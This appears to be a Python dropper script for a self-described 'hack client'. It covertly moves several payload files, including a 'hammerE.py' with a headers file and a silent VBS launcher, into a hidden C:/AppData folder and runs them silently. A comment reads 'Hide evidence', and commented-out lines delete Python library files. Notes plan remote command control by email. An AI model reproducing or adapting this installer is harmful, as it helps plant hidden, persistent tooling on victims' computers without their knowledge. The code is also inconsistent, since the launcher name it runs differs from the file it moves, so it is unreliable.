import os
import socket
import time
import getpass
import subprocess


#http://www.voidynullness.net/blog/2013/07/25/gmail-email-with-python-via-imap/

#http://naelshiab.com/tutorial-send-email-python/

#\\\\\\\\\\\\\\\\\\\\\\KEEP NAME TO "EthyHoH" OR WONT WORK////////////////////////
#\\\\\\\\\\\\\\\\\\\\\\MAKE SURE HACK CLIENT IS DIRECLY IN THE FOLDER/////////////

#IMPROVEMENTS: MAKE COMMANDS ABILITY THROUGH EMAIL

UserName = getpass.getuser()


cp1252 = 'C:/Users/' + UserName + '/AppData/Local/Programs/Python/Python36-32/lib/encodings/cp1252.py'
messages = 'C:/Users/' + UserName + '/AppData/Local/Programs/Python/Python36-32/lib/email/message.py'


try:
    print("LoadinG")
    #os.remove(cp1252)
except:
    print("cp not found")

try:
    print("NotCurropted")
    #os.remove(messages) NO DONT!
except:
    print("Message not")

MUS = socket.gethostname()
Smus = os.path.abspath("EEOE.py")
WT = 1

#Hidden File path
SF = os.path.abspath("CCEE.bat")


FP = Smus 

filepath = os.path.join('C:/AppData/', 'EEOE.py')
if not os.path.exists('C:/AppData/'):
    os.makedirs('C:/AppData/')
        
#Add Python Program...
if not os.path.exists('C:/Users/' + UserName + '/AppData/Local/Programs/Python'):
    Py = os.path.abspath('Python')
    os.rename(Py, 'C:/Users/' + UserName + '/AppData/Local/Programs/')

#

#Read OOCO


CF = os.path.abspath("CFCF.pyw")
os.rename(CF, "C:/AppData/CFCF.pyw")

FH = os.path.abspath("hammerE.py")
os.rename(FH, "C:/AppData/hammerE.py")

FHE = os.path.abspath("headersE.txt")
os.rename(FHE, "C:/AppData/headersE.txt")


FR = os.path.abspath("OOCO.py")
os.rename(FR, "C:/AppData/EEOE.py")

SD = os.path.abspath("SilentDMCrun.vbs")
os.rename(SD, "C:/AppData/SilentDMCrun.vbs")

RI = os.path.abspath("t0t.py")
os.rename(RI, "C:/AppData/t.py")

SysRun = os.path.abspath("SysReboot_EOEE.bat")
os.rename(SysRun, "C:/AppData/SysReboot_EOEE.bat")

os.system('SilentCMDrun.vbs')
WT = 0
    
    
#Hide evidence

